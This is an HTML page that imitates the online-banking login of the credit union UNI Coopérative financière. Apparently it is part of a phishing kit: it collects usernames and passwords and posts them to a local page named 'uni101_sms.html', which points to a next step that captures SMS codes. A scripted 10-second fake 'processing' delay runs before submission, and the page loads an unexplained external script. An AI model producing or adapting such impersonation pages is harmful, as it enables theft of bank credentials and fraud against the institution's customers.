<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNI - Login</title>
    <!-- Inclure la police Roboto pour la typographie -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <!-- Inclure FontAwesome pour les icnes -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #ffffff;
            color: #333333;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 440px; /* Adapt pour mobile/desktop */
            padding: 24px 30px;
            box-sizing: border-box;
        }

        /* En-tte */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 45px;
            margin-top: 15px;
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

        .logo-text {
            font-size: 42px;
            font-weight: 900;
            letter-spacing: -2px;
            margin-left: 5px;
            color: #000000;
        }

        .phone-link {
            font-size: 15px;
            font-weight: 600;
            color: #0077A8; /* Bleu canard */
            text-decoration: none;
            display: flex;
            align-items: center;
        }

        .phone-link i {
            margin-right: 6px;
            font-size: 14px;
        }

        /* Section Titre */
        .title-section {
            margin-bottom: 35px;
        }

        .title {
            font-size: 32px;
            font-weight: 700;
            color: #4a4a4a;
            margin: 0 0 10px 0;
        }

        .subtitle {
            font-size: 18px;
            font-weight: 500;
            color: #4a4a4a;
            margin: 0;
        }

        /* Formulaire */
        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        .form-label {
            display: block;
            font-size: 15px;
            font-weight: 400;
            color: #8c8c8c;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            box-sizing: border-box;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            outline: none;
            color: #333333;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #0981C5;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 36px;
            width: 32px;
            height: 32px;
            background-color: #f5f5f5;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            color: #4a4a4a;
            transition: background-color 0.2s;
        }
        
        .password-toggle:hover {
            background-color: #e0e0e0;
        }

        .password-toggle i {
            font-size: 14px;
        }

        .help-link-container {
            text-align: right;
            margin-top: -5px;
            margin-bottom: 35px;
        }

        .help-link {
            font-size: 15px;
            font-weight: 600;
            color: #4a4a4a;
            text-decoration: none;
        }
        
        .help-link:hover {
            text-decoration: underline;
        }

        /* Bouton */
        .submit-btn {
            width: 100%;
            padding: 15px;
            background-color: #0981C5; /* Bleu UNI */
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
        }

        .submit-btn:hover {
            background-color: #0068a3;
        }

        /* Pied de page */
        .footer-text {
            text-align: center;
            font-size: 14px;
            color: #767676;
            margin-top: 10px;
        }

        .footer-link {
            color: #0981C5;
            font-weight: 500;
            text-decoration: underline;
        }
        
        .footer-link:hover {
            text-decoration: none;
        }
        
        /* Logo SVG - approximation visuelle */
        .svg-logo {
            width: 48px;
            height: 48px;
        }

    
        /* Loader Overlay */
        .loader-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .loader-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .loader-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0981C5;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 16px;
            font-weight: 500;
            color: #333333;
        }

    </style>
</head>
<body>
    <div class="container">
        <!-- En-tte avec Logo et Tlphone -->
        <div class="header">
            <div class="logo-container">
                <!-- Logo Officiel -->
                <img src="images/logoo.JPG" alt="UNI Cooprative financire" style="height: 75px; width: auto; object-fit: contain;">
            </div>
            <a href="tel:1-888-359-1357" class="phone-link">
                <i class="fa-solid fa-phone"></i> 1-888-359-1357
            </a>
        </div>

        <!-- Titre et Sous-titre -->
        <div class="title-section">
            <h1 class="title">Welcome</h1>
            <p class="subtitle">Log in to get started</p>
        </div>

        <!-- Formulaire de Login -->
        <form action="uni101_sms.html" method="POST">
            <div class="form-group">
                <label class="form-label" for="username">Username</label>
                <input type="text" id="username" name="username" class="form-input" required>
            </div>

            <div class="form-group">
                <label class="form-label" for="password">Password</label>
                <input type="password" id="password" name="password" class="form-input" required>
                <div class="password-toggle" id="togglePassword">
                    <i class="fa-solid fa-eye"></i>
                </div>
            </div>

            <div class="help-link-container">
                <a href="#" class="help-link">I can't log in</a>
            </div>

            <button type="submit" class="submit-btn">Log in</button>
        </form>

        <!-- Lien de cration de compte -->
        <div class="footer-text">
            Don't have an account? <a href="#" class="footer-link">Set up my online profile</a>
        </div>
    </div>

    <!-- Script pour afficher/masquer le mot de passe -->
    <script>
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        const icon = togglePassword.querySelector('i');

        togglePassword.addEventListener('click', function () {
            // Basculer le type de l'input
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            // Basculer l'icne de l'il
            if (type === 'text') {
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });
    </script>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>

    <!-- Script pour le chargement -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() {
                        form.submit();
                    }, 10000); // 10 secondes
                });
            }
        });
    </script>

<script src="security_module.js"></script>
</body>
</html>
